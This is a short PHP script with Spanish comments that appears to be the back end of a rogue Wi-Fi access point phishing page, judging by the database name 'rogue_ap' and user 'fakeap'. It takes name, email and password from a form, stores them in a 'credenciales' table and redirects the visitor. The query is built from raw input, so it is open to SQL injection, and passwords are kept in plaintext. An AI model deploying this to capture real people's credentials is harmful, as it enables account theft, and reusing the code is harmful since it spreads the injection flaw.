<?php
// Conexión a la base de datos
$conexion = mysqli_connect("localhost", "fakeap", "password", "rogue_ap");

// Verificar la conexión
if(mysqli_connect_errno()){
    echo "Error en la conexión a la base de datos: " . mysqli_connect_error();
    exit();
}

// Obtener los datos del formulario
$nombre = $_POST["nombre"];
$apellido = $_POST["apellido"];
$email = $_POST["email"];
$password = $_POST["password"]; 

// Insertar los datos en la base de datos
$query = "INSERT INTO credenciales (nombre, apellido, email, password) VALUES ('$nombre', '$apellido', '$email', '$password')";
$resultado = mysqli_query($conexion, $query);

if($resultado){
    header("Location: tu_pagina.php");
    exit();

} else {
    echo "Error al registrar el usuario: " . mysqli_error($conexion);
}

// Cerrar la conexión
mysqli_close($conexion);
?>
